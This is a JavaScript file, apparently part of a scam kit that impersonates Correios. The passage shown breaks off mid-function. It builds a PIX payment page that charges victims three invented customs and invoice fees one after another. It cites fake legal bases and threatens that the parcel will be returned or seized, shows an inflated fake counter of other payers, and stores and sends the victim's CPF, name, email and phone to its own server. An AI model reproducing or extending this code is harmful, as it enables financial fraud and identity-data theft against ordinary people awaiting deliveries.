/**
 * CORREIOS - CHECKOUT PIX v4.1
 * Single-page checkout + multi-step upsells pós-pagamento
 * Flow: Form → PIX encomenda → pago → transição → nota fiscal PIX → pago → transição → desembaraço PIX → pago → redirect obrigado
 */
(function() {
    'use strict';

    // ========================================
    // CONFIG
    // ========================================
    var CONFIG = {
        API_PIX: 'api/pix.php',
        API_STATUS: 'api/status.php',
        API_TRACKING: 'api/save-tracking.php',
        CHECK_INTERVAL: 5000,
        EXPIRY_MIN: 15,
        EXPIRY_MS: 15 * 60 * 1000,
        REDIRECT_URL: 'obrigado.php',
        BUMP_PRICE: 1990,
        GOOGLE_ADS: true,
        TRANSITION_DELAY: 3000,

        STEPS: [
            {
                key: 'encomenda',
                title: 'Taxa Aduaneira',
                desc: 'Taxa de regularização aduaneira - Receita Federal',
                minCents: 6200, maxCents: 6797,
                storageKey: 'correios_taxa_valor_v4',
                transactionKey: 'correios_pix_tx_encomenda',
                googleAds: true,
                legalBase: 'Art. 1º da IN RFB nº 1.737/2017',
                risks: [
                    'Encomenda <strong>devolvida ao país de origem</strong>',
                    'Impossibilidade de novo envio pelo mesmo remetente',
                    'Perda total do valor do produto'
                ]
            },
            {
                key: 'notafiscal',
                title: 'Nota Fiscal Eletrônica (TENF)',
                desc: 'Taxa de emissão obrigatória conforme Decreto nº 6.022/2007',
                minCents: 2700, maxCents: 2797,
                storageKey: 'nfe_taxa_valor',
                transactionKey: 'correios_pix_tx_notafiscal',
                googleAds: true,
                legalBase: 'Decreto nº 6.022/2007 – Art. 2º',
                risks: [
                    'Encomenda <strong>retida por tempo indeterminado</strong>',
                    'Multa por descumprimento de obrigação fiscal',
                    'Processo administrativo junto à Receita Federal'
                ]
            },
            {
                key: 'frete',
                title: 'Taxa de Desembaraço Aduaneiro (TDA)',
                desc: 'Desembaraço obrigatório para liberação - IN RFB nº 1.737/2017',
                minCents: 2200, maxCents: 2797,
                storageKey: 'seg_taxa_valor',
                transactionKey: 'correios_pix_tx_frete',
                googleAds: true,
                legalBase: 'IN RFB nº 1.737/2017 – Art. 5º',
                risks: [
                    'Encomenda <strong>devolvida ao país de origem em 30 dias</strong>',
                    'Perda total do valor investido nas taxas anteriores',
                    'Impossibilidade de reenvio pelo mesmo remetente'
                ]
            }
        ],
        STEP_INDEX_KEY: 'correios_checkout_step_v4'
    };

    var EMAIL_DOMAINS = ['gmail.com','hotmail.com','outlook.com','yahoo.com.br','icloud.com','live.com'];
    var GENERIC_NAMES = ['cpf localizado','cpf encontrado','prezado destinatario','prezado destinatário','destinatario','destinatário','titular','usuario','usuário','cliente','---'];

    // ========================================
    // STATE
    // ========================================
    var state = {
        currentStepIndex: 0,
        amountCents: 0,
        bumpActive: false,
        transactionHash: null,
        pixCode: null,
        expirationTime: null,
        isGenerating: false,
        checkInterval: null,
        emailSuggestions: [],
        emailSuggestionIdx: -1
    };

    // ========================================
    // DOM
    // ========================================
    var el = {};
    function cacheDom() {
        el.form = document.getElementById('checkoutForm');
        el.formSection = document.getElementById('formSection');
        el.inputNome = document.getElementById('inputNome');
        el.inputCpf = document.getElementById('inputCpf');
        el.inputEmail = document.getElementById('inputEmail');
        el.inputTelefone = document.getElementById('inputTelefone');
        el.fieldNome = document.getElementById('fieldNome');
        el.fieldCpf = document.getElementById('fieldCpf');
        el.fieldEmail = document.getElementById('fieldEmail');
        el.fieldTelefone = document.getElementById('fieldTelefone');
        el.erroNome = document.getElementById('erroNome');
        el.erroCpf = document.getElementById('erroCpf');
        el.erroEmail = document.getElementById('erroEmail');
        el.erroTelefone = document.getElementById('erroTelefone');
        el.emailSuggestions = document.getElementById('emailSuggestions');
        el.productPrice = document.getElementById('productPrice');
        el.productTracking = document.getElementById('productTracking');
        el.bumpCheckbox = document.getElementById('bumpCheckbox');
        el.orderBump = document.getElementById('orderBump');
        el.orderSummary = document.getElementById('orderSummary');
        el.summaryBase = document.getElementById('summaryBase');
        el.summaryBumpLine = document.getElementById('summaryBumpLine');
        el.summaryTotal = document.getElementById('summaryTotal');
        el.proofCount = document.getElementById('proofCount');
        el.btnPagar = document.getElementById('btnPagar');
        el.ctaValor = document.getElementById('ctaValor');
        el.socialProof = document.querySelector('.social-proof');
        el.trustBadges = document.querySelector('.trust-badges');
        el.pixSection = document.getElementById('pixSection');
        el.pixLoading = document.getElementById('pixLoading');
        el.pixError = document.getElementById('pixError');
        el.pixErrorMsg = document.getElementById('pixErrorMsg');
        el.pixContent = document.getElementById('pixContent');
        el.pixValor = document.getElementById('pixValor');
        el.pixTimer = document.getElementById('pixTimer');
        el.pixTimerBar = document.getElementById('pixTimerBar');
        el.pixQrCode = document.getElementById('pixQrCode');
        el.pixCodeInput = document.getElementById('pixCodeInput');
        el.btnCopiar = document.getElementById('btnCopiar');
        el.pixRecebedor = document.getElementById('pixRecebedor');
        el.pixStatusWaiting = document.getElementById('pixStatusWaiting');
        el.pixStatusPaid = document.getElementById('pixStatusPaid');
        el.btnRetry = document.getElementById('btnRetry');
        el.pendenciaBar = document.getElementById('pendenciaBar');
        el.pendenciaLabel = document.getElementById('pendenciaLabel');
        el.pendenciaStepName = document.getElementById('pendenciaStepName');
        el.pendenciaFill = document.getElementById('pendenciaFill');
        el.screenTransicao = document.getElementById('screenTransicao');
        el.screenNovaPendencia = document.getElementById('screenNovaPendencia');
        el.novaPendenciaTitulo = document.getElementById('novaPendenciaTitulo');
        el.novaPendenciaDesc = document.getElementById('novaPendenciaDesc');
        el.novaPendenciaLegalBase = document.getElementById('novaPendenciaLegalBase');
        el.novaPendenciaValor = document.getElementById('novaPendenciaValor');
        el.novaPendenciaRiscos = document.getElementById('novaPendenciaRiscos');
        el.btnPagarPendencia = document.getElementById('btnPagarPendencia');
        el.checkoutWrapper = document.querySelector('.checkout-wrapper');
    }

    // ========================================
    // HELPERS
    // ========================================
    function formatMoney(cents) {
        return 'R$ ' + (cents / 100).toFixed(2).replace('.', ',');
    }

    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function getUrlParam(key) {
        return new URLSearchParams(window.location.search).get(key) || '';
    }

    function decodeName(name) {
        if (!name) return '';
        try {
            var d = name;
            while (d.indexOf('%') !== -1) {
                var n = decodeURIComponent(d);
                if (n === d) break;
                d = n;
            }
            return d.trim();
        } catch(e) { return name; }
    }

    function isGenericName(name) {
        if (!name) return true;
        var lower = name.toLowerCase().trim();
        for (var i = 0; i < GENERIC_NAMES.length; i++) {
            if (lower.indexOf(GENERIC_NAMES[i]) !== -1) return true;
        }
        return false;
    }

    function getSessionData() {
        try { return JSON.parse(localStorage.getItem('correios_session') || '{}'); } catch(e) { return {}; }
    }

    function getTrackingParams() {
        var params = {};
        var keys = ['gclid','gbraid','wbraid','utm_source','utm_medium','utm_campaign'];
        keys.forEach(function(k) {
            var v = getUrlParam(k);
            if (v) params[k] = v;
        });
        if (!params.gclid) {
            try {
                var saved = JSON.parse(localStorage.getItem('correios_tracking') || '{}');
                if (saved.gclid) params.gclid = saved.gclid;
            } catch(e) {}
        }
        return params;
    }

    // ========================================
    // FIXED: appendTrackingParams
    // Agora passa CPF, nome e rastreio junto com os tracking params
    // ========================================
    function appendTrackingParams(url) {
        var p = new URLSearchParams(window.location.search);
        var params = new URLSearchParams();

        // Passa CPF, nome e rastreio — lê do localStorage como fallback
        var cpf     = localStorage.getItem('correios_cpf')      || p.get('cpf')     || '';
        var nome    = localStorage.getItem('correios_nome')     || p.get('nome')    || '';
        var rastreio = localStorage.getItem('correios_rastreio') || p.get('rastreio') || p.get('codigo') || '';

        if (cpf)      params.set('cpf', cpf);
        if (nome)     params.set('nome', encodeURIComponent(nome));
        if (rastreio) params.set('rastreio', rastreio);

        // Passa tracking params (gclid, utm, etc.) — exclui chaves de dados pessoais
        p.forEach(function(val, key) {
            if (['codigo','cpf','nome','rastreio','_t'].indexOf(key) === -1) {
                params.set(key, val);
            }
        });

        var qs = params.toString();
        return url + (qs ? (url.indexOf('?') === -1 ? '?' : '&') + qs : '');
    }

    function currentStep() {
        return CONFIG.STEPS[state.currentStepIndex];
    }

    // ========================================
    // VALIDATION
    // ========================================
    function validateNome(val) {
        var v = val.trim();
        if (!v) return 'Informe seu nome completo';
        if (v.split(/\s+/).length < 2) return 'Informe nome e sobrenome';
        if (isGenericName(v)) return 'Informe seu nome real';
        if (v.length < 5) return 'Nome muito curto';
        return '';
    }

    function validateCpf(val) {
        var digits = val.replace(/\D/g, '');
        if (!digits) return 'Informe seu CPF';
        if (digits.length !== 11) return 'CPF deve ter 11 dígitos';
        if (/^(\d)\1{10}$/.test(digits)) return 'CPF inválido';
        var sum = 0;
        for (var i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
        var d1 = 11 - (sum % 11); if (d1 >= 10) d1 = 0;
        if (parseInt(digits[9]) !== d1) return 'CPF inválido';
        sum = 0;
        for (var j = 0; j < 10; j++) sum += parseInt(digits[j]) * (11 - j);
        var d2 = 11 - (sum % 11); if (d2 >= 10) d2 = 0;
        if (parseInt(digits[10]) !== d2) return 'CPF inválido';
        return '';
    }

    function validateEmail(val) {
        var v = val.trim();
        if (!v) return 'Informe seu e-mail';
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) return 'E-mail inválido';
        return '';
    }

    function validateTelefone(val) {
        var digits = val.replace(/\D/g, '');
        if (!digits) return '';
        if (digits.length < 10 || digits.length > 11) return 'Telefone inválido';
        return '';
    }

    function setFieldState(name, error) {
        var capName = name.charAt(0).toUpperCase() + name.slice(1);
        var field = el['field' + capName];
        var errorEl = el['erro' + capName];
        if (!field) return;
        field.classList.remove('valid', 'invalid');
        if (error) {
            field.classList.add('invalid');
            if (errorEl) errorEl.textContent = error;
        } else {
            var input = field.querySelector('input');
            if (input && input.value.trim()) field.classList.add('valid');
            if (errorEl) errorEl.textContent = '';
        }
    }

    function validateField(name) {
        var capName = name.charAt(0).toUpperCase() + name.slice(1);
        var val = el['input' + capName].value;
        var error = '';
        if (name === 'nome') error = validateNome(val);
        else if (name === 'cpf') error = validateCpf(val);
        else if (name === 'email') error = validateEmail(val);
        else if (name === 'telefone') error = validateTelefone(val);
        setFieldState(name, error);
        return !error;
    }

    function validateAll() {
        var ok = true;
        ['nome','cpf','email','telefone'].forEach(function(f) {
            if (!validateField(f)) ok = false;
        });
        return ok;
    }

    // ========================================
    // MASKS
    // ========================================
    function maskCpf(val) {
        var d = val.replace(/\D/g, '').slice(0, 11);
        if (d.length > 9) return d.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
        if (d.length > 6) return d.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        if (d.length > 3) return d.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        return d;
    }

    function maskPhone(val) {
        var d = val.replace(/\D/g, '').slice(0, 11);
        if (d.length > 6) return d.replace(/(\d{2})(\d{4,5})(\d{1,4})/, '($1) $2-$3');
        if (d.length > 2) return d.replace(/(\d{2})(\d{1,5})/, '($1) $2');
        if (d.length > 0) return '(' + d;
        return '';
    }

    // ========================================
    // EMAIL SUGGESTIONS
    // ========================================
    function updateEmailSuggestions() {
        var val = el.inputEmail.value.trim();
        var atIdx = val.indexOf('@');
        if (atIdx === -1 || atIdx === 0) { hideEmailSuggestions(); return; }
        var local = val.substring(0, atIdx);
        var domain = val.substring(atIdx + 1).toLowerCase();
        var matches = [];
        EMAIL_DOMAINS.forEach(function(d) {
            if (d.indexOf(domain) === 0 && d !== domain) matches.push(local + '@' + d);
        });
        if (!matches.length) { hideEmailSuggestions(); return; }
        state.emailSuggestions = matches;
        state.emailSuggestionIdx = -1;
        el.emailSuggestions.innerHTML = matches.map(function(m, i) {
            return '<div class="email-suggestion" data-idx="' + i + '">' + m + '</div>';
        }).join('');
        el.emailSuggestions.classList.add('active');
    }

    function hideEmailSuggestions() {
        state.emailSuggestions = [];
        state.emailSuggestionIdx = -1;
        el.emailSuggestions.classList.remove('active');
    }

    function selectEmailSuggestion(idx) {
        if (state.emailSuggestions[idx]) {
            el.inputEmail.value = state.emailSuggestions[idx];
            hideEmailSuggestions();
            validateField('email');
        }
    }

    // ========================================
    // PRICING & ORDER BUMP
    // ========================================
    function generateAmount(stepIndex) {
        var step = CONFIG.STEPS[stepIndex];
        var stored = localStorage.getItem(step.storageKey);
        if (stored) {
            var parsed = parseInt(stored);
            if (parsed >= step.minCents && parsed <= step.maxCents) return parsed;
        }
        var val = randomInt(step.minCents, step.maxCents);
        localStorage.setItem(step.storageKey, val);
        return val;
    }

    function updatePricing() {
        var base = state.amountCents;
        var bump = (state.currentStepIndex === 0 && state.bumpActive) ? CONFIG.BUMP_PRICE : 0;
        var total = base + bump;
        el.productPrice.textContent = formatMoney(base);
        el.summaryBase.textContent = formatMoney(base);
        el.summaryBumpLine.style.display = (state.currentStepIndex === 0 && state.bumpActive) ? 'flex' : 'none';
        el.summaryTotal.textContent = formatMoney(total);
        el.ctaValor.textContent = formatMoney(total);
    }

    function toggleBump() {
        state.bumpActive = el.bumpCheckbox.checked;
        el.orderBump.classList.toggle('active', state.bumpActive);
        updatePricing();
    }

    // ========================================
    // SOCIAL PROOF
    // ========================================
    function initSocialProof() {
        var base = randomInt(847, 1523);
        el.proofCount.textContent = base.toLocaleString('pt-BR');
        setInterval(function() {
            base += randomInt(1, 3);
            el.proofCount.textContent = base.toLocaleString('pt-BR');
        }, randomInt(8000, 15000));
    }

    // ========================================
    // UI STATE MANAGEMENT
    // ========================================
    function showCheckoutForm() {
        el.checkoutWrapper.style.display = 'block';
        el.formSection.style.display = 'block';
        el.orderBump.style.display = 'block';
        el.orderSummary.style.display = 'block';
        el.socialProof.style.display = 'flex';
        el.btnPagar.style.display = 'flex';
        el.trustBadges.style.display = 'flex';
        el.pixSection.style.display = 'none';
        el.pendenciaBar.style.display = 'none';
        el.screenTransicao.style.display = 'none';
        el.screenNovaPendencia.style.display = 'none';
    }

    function hideCheckoutShowPix() {
        el.formSection.style.display = 'none';
        el.orderBump.style.display = 'none';
        el.orderSummary.style.display = 'none';
        el.socialProof.style.display = 'none';
        el.btnPagar.style.display = 'none';
        el.trustBadges.style.display = 'none';
        el.screenTransicao.style.display = 'none';
        el.screenNovaPendencia.style.display = 'none';

        el.pixSection.style.display = 'block';
        el.pixLoading.style.display = 'block';
        el.pixError.style.display = 'none';
        el.pixContent.style.display = 'none';
    }

    function showTransition() {
        el.checkoutWrapper.style.display = 'none';
        el.screenTransicao.style.display = 'block';
        el.screenNovaPendencia.style.display = 'none';
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function showNovaPendencia(step) {
        el.screenTransicao.style.display = 'none';
        el.screenNovaPendencia.style.display = 'block';

        var amount = generateAmount(state.currentStepIndex);
        state.amountCents = amount;

        el.novaPendenciaTitulo.textContent = step.title;
        el.novaPendenciaDesc.textContent = step.desc;
        el.novaPendenciaLegalBase.textContent = step.legalBase;
        el.novaPendenciaValor.textContent = formatMoney(amount);

        el.novaPendenciaRiscos.innerHTML = step.risks.map(function(r) {
            return '<li>' + r + '</li>';
        }).join('');

        el.pendenciaBar.style.display = 'block';
        var stepNum = state.currentStepIndex + 1;
        var total = CONFIG.STEPS.length;
        el.pendenciaLabel.textContent = 'Pendência ' + stepNum + ' de ' + total;
        el.pendenciaStepName.textContent = step.title;
        el.pendenciaFill.style.width = ((stepNum / total) * 100) + '%';

        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function showPixForStep() {
        el.screenNovaPendencia.style.display = 'none';
        el.checkoutWrapper.style.display = 'block';

        el.formSection.style.display = 'none';
        el.orderBump.style.display = 'none';
        el.orderSummary.style.display = 'none';
        el.socialProof.style.display = 'none';
        el.btnPagar.style.display = 'none';
        el.trustBadges.style.display = 'none';

        el.pixSection.style.display = 'block';
        el.pixLoading.style.display = 'block';
        el.pixError.style.display = 'none';
        el.pixContent.style.display = 'none';

        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // ========================================
    // PIX GENERATION
    // ========================================
    function gerarPix() {
        if (state.isGenerating) return;
        state.isGenerating = true;

        var step = currentStep();
        var isFirstStep = state.currentStepIndex === 0;

        if (isFirstStep) {
            hideCheckoutShowPix();
            if (typeof window.dispararCheckoutConversao === 'function') window.dispararCheckoutConversao();
        } else {
            showPixForStep();
        }

        var sessionData = getSessionData();
        var trackingParams = getTrackingParams();
        var totalAmount = state.amountCents + (isFirstStep && state.bumpActive ? CONFIG.BUMP_PRICE : 0);

        var cpfRaw = el.inputCpf.value.replace(/\D/g, '');
        if (!cpfRaw) cpfRaw = localStorage.getItem('correios_cpf') || '';
        if (!cpfRaw) {
            var urlCpf = new URLSearchParams(window.location.search).get('cpf') || '';
            cpfRaw = urlCpf.replace(/\D/g,'');
        }

        // Salva CPF no localStorage para garantir que persiste
        if (cpfRaw) localStorage.setItem('correios_cpf', cpfRaw);

        var nomeVal = el.inputNome.value.trim();
        if (nomeVal) localStorage.setItem('correios_nome', nomeVal);

        var payload = {
            step: step.key,
            session_id: sessionData.id || window._dsid || ('pag_' + Date.now().toString(36)),
            cpf: cpfRaw,
            nome: nomeVal,
            email: el.inputEmail.value.trim(),
            telefone: el.inputTelefone.value.replace(/\D/g, ''),
            amount: totalAmount,
            sedex: isFirstStep ? state.bumpActive : false
        };

        Object.keys(trackingParams).forEach(function(k) { payload[k] = trackingParams[k]; });

        fetch(CONFIG.API_PIX, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(function(res) {
            if (res.status === 409) {
                advanceToNextStep();
                return null;
            }
            return res.json();
        })
        .then(function(data) {
            if (!data) return;
            if (!data.success) {
                el.pixLoading.style.display = 'none';
                el.pixError.style.display = 'block';
                el.pixErrorMsg.textContent = data.error || 'Erro ao gerar PIX';
                state.isGenerating = false;
                return;
            }

            var d = data.data;
            state.transactionHash = d.transaction_hash;
            state.pixCode = d.pix_code;
            state.expirationTime = new Date(d.expires_at).getTime() || (Date.now() + CONFIG.EXPIRY_MS);

            localStorage.setItem(step.transactionKey, JSON.stringify({
                hash: d.transaction_hash,
                pixCode: d.pix_code,
                qrcode: d.pix_qrcode,
                amount: d.amount,
                expiresAt: state.expirationTime,
                receiver: d.receiver,
                createdAt: Date.now()
            }));

            if (isFirstStep) {
                localStorage.setItem('correios_email', el.inputEmail.value.trim());
                localStorage.setItem('correios_telefone', el.inputTelefone.value.trim());
            }

            displayPixData(d);
            el.pixLoading.style.display = 'none';
            el.pixContent.style.display = 'block';
            autoCopyPix();
            startStatusPolling();
            startPixTimer();
            state.isGenerating = false;
        })
        .catch(function() {
            el.pixLoading.style.display = 'none';
            el.pixError.style.display = 'block';
            el.pixErrorMsg.textContent = 'Erro de conexão. Verifique sua internet.';
            state.isGenerating = false;
        });
    }

    function displayPixData(d) {
        var total = d.amount || state.amountCents;
        el.pixValor.textContent = formatMoney(total);

        if (d.pix_qrcode) {
            if (d.pix_qrcode.startsWith('http') || d.pix_qrcode.startsWith('data:')) {
                el.pixQrCode.src = d.pix_qrcode;
            } else {
                el.pixQrCode.src = 'data:image/png;base64,' + d.pix_qrcode;
            }
        } else if (d.pix_code && typeof qrcode !== 'undefined') {
            var qr = qrcode(0, 'M');
            qr.addData(d.pix_code);
            qr.make();
            el.pixQrCode.src = qr.createDataURL(4, 0);
        }

        el.pixCodeInput.value = d.pix_code || '';

        var receiverName = '';
        if (d.receiver && d.receiver.name) receiverName = d.receiver.name;
        else if (d.pix_code) receiverName = extractReceiverFromPix(d.pix_code);
        el.pixRecebedor.textContent = receiverName || 'Instituição autorizada pelo BC';

        el.pixStatusWaiting.style.display = 'flex';
        el.pixStatusPaid.style.display = 'none';
    }

    function extractReceiverFromPix(code) {
        try {
            var pos = 0;
            while (pos < code.length - 4) {
                var id = code.substring(pos, pos + 2);
                var len = parseInt(code.substring(pos + 2, pos + 4));
                if (isNaN(len)) break;
                var val = code.substring(pos + 4, pos + 4 + len);
                if (id === '59') return val;
                pos += 4 + len;
            }
        } catch(e) {}
        return '';
    }

    // ========================================
    // COPY
    // ========================================
    function autoCopyPix() {
        if (!state.pixCode) return;
        try { navigator.clipboard.writeText(state.pixCode).then(function() { showCopied(); }).catch(function() {}); } catch(e) {}
    }

    function copiarCodigo() {
        var code = el.pixCodeInput.value;
        if (!code) return;
        try {
            navigator.clipboard.writeText(code).then(function() { showCopied(); }).catch(function() {
                el.pixCodeInput.select(); document.execCommand('copy'); showCopied();
            });
        } catch(e) {
            el.pixCodeInput.select(); document.execCommand('copy'); showCopied();
        }
    }

    function showCopied() {
        el.btnCopiar.classList.add('copied');
        var original = el.btnCopiar.innerHTML;
        el.btnCopiar.innerHTML = '<i class="fas fa-check"></i> CÓDIGO COPIADO!';
        setTimeout(function() {
            el.btnCopiar.classList.remove('copied');
            el.btnCopiar.innerHTML = original;
        }, 3000);
    }

    // ========================================
    // STATUS POLLING
    // ========================================
    function startStatusPolling() {
        if (state.checkInterval) clearInterval(state.checkInterval);
        state.checkInterval = setInterval(checkStatus, CONFIG.CHECK_INTERVAL);
    }

    function checkStatus() {
        if (!state.transactionHash) return;
        fetch(CONFIG.API_STATUS + '?hash=' + encodeURIComponent(state.transactionHash) + '&step=' + encodeURIComponent(currentStep().key))
            .then(function(r) { return r.json(); })
            .then(function(resp) {
                var d = resp.data || resp;
                if (d.is_paid) paymentConfirmed();
            })
            .catch(function() {});
    }

    function paymentConfirmed() {
        if (state.checkInterval) clearInterval(state.checkInterval);

        el.pixStatusWaiting.style.display = 'none';
        el.pixStatusPaid.style.display = 'flex';

        if (currentStep().googleAds) {
            var total = state.amountCents;
            if (state.currentStepIndex === 0 && state.bumpActive) total += CONFIG.BUMP_PRICE;
            if (typeof window.dispararConversaoGoogleAds === 'function') {
                window.dispararConversaoGoogleAds(total / 100, state.transactionHash);
            }
            if (typeof gtag === 'function') {
                gtag('event', 'conversion', {
                    send_to: 'AW-1040996610/9uqNCODu6Y4cEIKysfAD',
                    value: total / 100,
                    currency: 'BRL',
                    transaction_id: state.transactionHash
                });
            }
        }

        if (typeof window._trackEvent === 'function') {
            window._trackEvent('payment_confirmed', currentStep().key);
        }

        localStorage.removeItem(currentStep().transactionKey);

        setTimeout(function() {
            advanceToNextStep();
        }, 2000);
    }

    // ========================================
    // MULTI-STEP FLOW
    // ========================================
    function advanceToNextStep() {
        var nextIndex = state.currentStepIndex + 1;

        if (nextIndex >= CONFIG.STEPS.length) {
            // Todos os steps concluídos — redireciona para obrigado com CPF e dados
            localStorage.removeItem(CONFIG.STEP_INDEX_KEY);
            window.location.href = appendTrackingParams(CONFIG.REDIRECT_URL);
            return;
        }

        state.currentStepIndex = nextIndex;
        localStorage.setItem(CONFIG.STEP_INDEX_KEY, nextIndex);

        state.transactionHash = null;
        state.pixCode = null;
        state.expirationTime = null;
        state.isGenerating = false;
        if (state.checkInterval) clearInterval(state.checkInterval);

        showTransition();

        setTimeout(function() {
            showNovaPendencia(CONFIG.STEPS[nextIndex]);
        }, CONFIG.TRANSITION_DELAY);
    }

    // ==========================================
// PIX TIMER (Corrigido para 15 minutos fixos)
// ==========================================
function startPixTimer() {
    var timerEl = document.querySelector('.pix-timer');
    if (timerEl) {
        timerEl.classList.remove('warning', 'critical');
    }

    // Define o tempo exato de 15 minutos a partir de AGORA (em milissegundos)
    var durationMs = 15 * 60 * 1000; 
    var endTime = Date.now() + durationMs;

    function tick() {
        var diff = endTime - Date.now();

        // Se o tempo acabou
        if (diff <= 0) {
            el.pixTimer.textContent = '00:00';
            if (timerEl) {
                timerEl.classList.remove('warning');
                timerEl.classList.add('critical');
            }
            if (el.pixTimerBar) el.pixTimerBar.style.width = '0%';
            return; // Para a contagem
        }

        // Calcula minutos e segundos
        var m = Math.floor(diff / 60000);
        var s = Math.floor((diff % 60000) / 1000);

        // Atualiza o texto com zero à esquerda (ex: 09:05)
        el.pixTimer.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');

        // Atualiza a barra de progresso
        var pct = Math.min(100, ((durationMs - diff) / durationMs) * 100);
        if (el.pixTimerBar) {
            el.pixTimerBar.style.width = (100 - pct) + '%';
        }

        // Adiciona as cores de aviso conforme o tempo cai
        if (m < 2 && timerEl) {
            timerEl.classList.remove('warning');
            timerEl.classList.add('critical');
        } else if (m < 5 && timerEl) {
            timerEl.classList.add('warning');
        }

        // Roda o próximo quadro de animação
        requestAnimationFrame(tick);
    }
    
    // Inicia a contagem
    tick();
}

    // ========================================
    // FORM SUBMIT
    // ========================================
    function handleSubmit() {
        if (state.isGenerating) return;
        if (!validateAll()) {
            document.querySelectorAll('.form-field.invalid').forEach(function(f) {
                f.classList.add('shake');
                setTimeout(function() { f.classList.remove('shake'); }, 400);
            });
            var first = document.querySelector('.form-field.invalid');
            if (first) first.scrollIntoView({ behavior: 'smooth', block: 'center' });
            return;
        }
        gerarPix();
    }

    // ========================================
    // RESTORE SAVED TRANSACTION
    // ========================================
    function tryRestoreTransaction() {
        var step = currentStep();
        try {
            var saved = JSON.parse(localStorage.getItem(step.transactionKey));
            if (!saved || !saved.hash || !saved.pixCode) return false;
            if (Date.now() > saved.expiresAt) {
                localStorage.removeItem(step.transactionKey);
                return false;
            }

            state.transactionHash = saved.hash;
            state.pixCode = saved.pixCode;
            state.expirationTime = saved.expiresAt;
            state.amountCents = saved.amount || generateAmount(state.currentStepIndex);

            if (state.currentStepIndex === 0) {
                hideCheckoutShowPix();
            } else {
                el.pendenciaBar.style.display = 'block';
                var stepNum = state.currentStepIndex + 1;
                el.pendenciaLabel.textContent = 'Pendência ' + stepNum + ' de ' + CONFIG.STEPS.length;
                el.pendenciaStepName.textContent = step.title;
                el.pendenciaFill.style.width = ((stepNum / CONFIG.STEPS.length) * 100) + '%';
                showPixForStep();
            }

            displayPixData({
                transaction_hash: saved.hash,
                pix_code: saved.pixCode,
                pix_qrcode: saved.qrcode,
                amount: saved.amount,
                receiver: saved.receiver
            });

            el.pixLoading.style.display = 'none';
            el.pixContent.style.display = 'block';
            startStatusPolling();
            startPixTimer();
            return true;
        } catch(e) {
            return false;
        }
    }

    // ========================================
    // INIT
    // ========================================
    function init() {
        cacheDom();

        var savedStep = parseInt(localStorage.getItem(CONFIG.STEP_INDEX_KEY) || '0');
        if (savedStep >= 0 && savedStep < CONFIG.STEPS.length) {
            state.currentStepIndex = savedStep;
        }

        state.amountCents = generateAmount(state.currentStepIndex);
        updatePricing();

        var urlCpf = getUrlParam('cpf');
        var urlNome = decodeName(getUrlParam('nome'));
        var urlCodigo = getUrlParam('codigo') || getUrlParam('rastreio');

        if (urlNome && !isGenericName(urlNome)) {
            el.inputNome.value = urlNome;
            localStorage.setItem('correios_nome', urlNome);
        } else {
            var savedNome = localStorage.getItem('correios_nome');
            if (savedNome && !isGenericName(savedNome)) el.inputNome.value = savedNome;
        }

        if (urlCpf && urlCpf.replace(/\D/g,'').length === 11) {
            el.inputCpf.value = maskCpf(urlCpf);
            localStorage.setItem('correios_cpf', urlCpf.replace(/\D/g,''));
        } else {
            var savedCpf = localStorage.getItem('correios_cpf');
            if (savedCpf) el.inputCpf.value = maskCpf(savedCpf);
        }

        var savedEmail = localStorage.getItem('correios_email');
        if (savedEmail) el.inputEmail.value = savedEmail;

        var savedTel = localStorage.getItem('correios_telefone');
        if (savedTel) el.inputTelefone.value = savedTel;

        if (urlCodigo) {
            el.productTracking.textContent = urlCodigo;
            localStorage.setItem('correios_rastreio', urlCodigo);
        }

        ['nome','cpf','email'].forEach(function(f) {
            var capName = f.charAt(0).toUpperCase() + f.slice(1);
            var input = el['input' + capName];
            if (input && input.value.trim()) validateField(f);
        });

        initSocialProof();

        // --- EVENTS ---
        el.inputCpf.addEventListener('input', function() {
            this.value = maskCpf(this.value);
            validateField('cpf');
        });
        el.inputTelefone.addEventListener('input', function() {
            this.value = maskPhone(this.value);
            validateField('telefone');
        });
        el.inputNome.addEventListener('blur', function() { validateField('nome'); });
        el.inputNome.addEventListener('input', function() {
            if (el.fieldNome.classList.contains('invalid')) validateField('nome');
        });
        el.inputEmail.addEventListener('input', function() {
            updateEmailSuggestions();
            if (el.fieldEmail.classList.contains('invalid')) validateField('email');
        });
        el.inputEmail.addEventListener('blur', function() {
            setTimeout(hideEmailSuggestions, 200);
            validateField('email');
        });
        el.inputEmail.addEventListener('keydown', function(e) {
            if (!state.emailSuggestions.length) return;
            if (e.key === 'ArrowDown') { e.preventDefault(); state.emailSuggestionIdx = Math.min(state.emailSuggestionIdx + 1, state.emailSuggestions.length - 1); highlightSuggestion(); }
            else if (e.key === 'ArrowUp') { e.preventDefault(); state.emailSuggestionIdx = Math.max(state.emailSuggestionIdx - 1, 0); highlightSuggestion(); }
            else if (e.key === 'Enter' && state.emailSuggestionIdx >= 0) { e.preventDefault(); selectEmailSuggestion(state.emailSuggestionIdx); }
            else if (e.key === 'Escape') hideEmailSuggestions();
        });
        el.emailSuggestions.addEventListener('click', function(e) {
            var item = e.target.closest('.email-suggestion');
            if (item) selectEmailSuggestion(parseInt(item.dataset.idx));
        });

        function highlightSuggestion() {
            el.emailSuggestions.querySelectorAll('.email-suggestion').forEach(function(s, i) {
                s.classList.toggle('highlighted', i === state.emailSuggestionIdx);
            });
        }

        el.bumpCheckbox.addEventListener('change', toggleBump);
        el.btnPagar.addEventListener('click', handleSubmit);
        el.form.addEventListener('submit', function(e) { e.preventDefault(); handleSubmit(); });
        el.btnCopiar.addEventListener('click', copiarCodigo);
        el.btnRetry.addEventListener('click', function() { state.isGenerating = false; gerarPix(); });

        el.btnPagarPendencia.addEventListener('click', function() {
            gerarPix();
        });

        if (state.currentStepIndex > 0) {
            if (!tryRestoreTransaction()) {
                el.checkoutWrapper.style.display = 'none';
                showNovaPendencia(currentStep());
